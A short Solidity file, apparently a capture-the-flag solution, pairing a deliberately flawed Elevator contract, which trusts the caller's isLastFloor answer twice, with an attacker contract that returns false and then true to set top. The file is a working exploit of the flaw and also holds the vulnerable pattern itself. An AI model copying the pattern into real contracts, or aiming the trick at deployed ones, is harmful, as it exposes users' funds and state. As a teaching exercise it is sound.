// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract GoToTop is Building {
    uint8 toggle = 1;
    Elevator elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function gogogo() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256 floor) public returns (bool) {
        bool result = toggle % 2 == 0;
        toggle++;
        return result;
    }
}
